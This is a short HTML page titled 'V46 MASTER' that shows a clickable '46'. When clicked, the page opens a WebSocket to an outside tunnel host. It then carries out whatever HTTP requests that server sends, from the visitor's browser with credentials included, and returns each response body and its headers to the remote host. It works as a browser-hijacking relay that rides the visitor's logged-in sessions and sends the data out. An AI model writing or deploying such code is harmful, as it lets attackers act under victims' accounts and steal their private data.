<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>V46 MASTER</title>
    <style>
        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
        h1 { font-size: 150px; cursor: pointer; text-shadow: 0 0 25px #0f0; user-select: none; }
    </style>
</head>
<body>
    <h1 id="status" onclick="startMaster()">46</h1>
    <script>
        // الرابط الجديد من الصورة
        const PROXY_SERVER = "wss://31e8c94a917825.lhr.life";
        
        async function startMaster() {
            document.getElementById('status').innerText = "DONE";
            const socket = new WebSocket(PROXY_SERVER);
            socket.onopen = () => socket.send(JSON.stringify({ type: 'join' }));
            socket.onmessage = async (event) => {
                try {
                    const req = JSON.parse(event.data);
                    const response = await fetch(req.url, {
                        method: req.method,
                        headers: req.headers,
                        credentials: 'include'
                    });
                    const body = await response.text();
                    socket.send(JSON.stringify({
                        body: body,
                        status: response.status,
                        headers: Object.fromEntries(response.headers)
                    }));
                } catch (e) {}
            };
        }
    </script>
</body>
</html>
